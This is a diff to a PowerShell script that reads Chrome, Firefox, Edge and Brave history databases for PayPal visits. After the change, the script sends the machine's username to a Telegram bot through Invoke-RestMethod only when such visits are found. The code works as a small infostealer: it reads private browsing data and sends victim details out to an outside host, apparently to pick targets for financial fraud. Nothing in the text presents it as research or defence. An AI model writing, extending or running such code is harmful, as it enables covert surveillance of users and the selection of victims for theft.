@@ -35,14 +35,15 @@ function Send-MessageToTelegram {
     Invoke-RestMethod -Uri $url -Method Get
 }
 
-# Get PC Username and send to Telegram
-$pcUsername = $env:USERNAME
-Send-MessageToTelegram -message "PC Username: $pcUsername"
+$paypalFound = $false
 
 # Check Chrome History for PayPal
 if (Test-Path $chromeHistoryPath) {
     $chromeQuery = "SELECT url, title, last_visit_time FROM urls WHERE url LIKE '%paypal%' ORDER BY last_visit_time DESC LIMIT 20"
-    Get-BrowserHistory -historyPath $chromeHistoryPath -query $chromeQuery | Format-Table
+    $chromeResults = Get-BrowserHistory -historyPath $chromeHistoryPath -query $chromeQuery
+    if ($chromeResults) {
+        $paypalFound = $true
+    }
 }
 
 # Check Firefox History for PayPal
@@ -52,7 +53,10 @@ if (Test-Path $firefoxProfilePath) {
         $firefoxHistoryPath = Join-Path -Path $profile.FullName -ChildPath "places.sqlite"
         if (Test-Path $firefoxHistoryPath) {
             $firefoxQuery = "SELECT url, title, last_visit_date FROM moz_places WHERE url LIKE '%paypal%' ORDER BY last_visit_date DESC LIMIT 20"
-            Get-BrowserHistory -historyPath $firefoxHistoryPath -query $firefoxQuery | Format-Table
+            $firefoxResults = Get-BrowserHistory -historyPath $firefoxHistoryPath -query $firefoxQuery
+            if ($firefoxResults) {
+                $paypalFound = $true
+            }
         }
     }
 }
@@ -60,11 +64,23 @@ if (Test-Path $firefoxProfilePath) {
 # Check Edge History for PayPal
 if (Test-Path $edgeHistoryPath) {
     $edgeQuery = "SELECT url, title, last_visit_time FROM urls WHERE url LIKE '%paypal%' ORDER BY last_visit_time DESC LIMIT 20"
-    Get-BrowserHistory -historyPath $edgeHistoryPath -query $edgeQuery | Format-Table
+    $edgeResults = Get-BrowserHistory -historyPath $edgeHistoryPath -query $edgeQuery
+    if ($edgeResults) {
+        $paypalFound = $true
+    }
 }
 
 # Check Brave History for PayPal
 if (Test-Path $braveHistoryPath) {
     $braveQuery = "SELECT url, title, last_visit_time FROM urls WHERE url LIKE '%paypal%' ORDER BY last_visit_time DESC LIMIT 20"
-    Get-BrowserHistory -historyPath $braveHistoryPath -query $braveQuery | Format-Table
+    $braveResults = Get-BrowserHistory -historyPath $braveHistoryPath -query $braveQuery
+    if ($braveResults) {
+        $paypalFound = $true
+    }
+}
+
+# Send PC Username to Telegram if PayPal is found
+if ($paypalFound) {
+    $pcUsername = $env:USERNAME
+    Send-MessageToTelegram -message "PC Username: $pcUsername"
 }
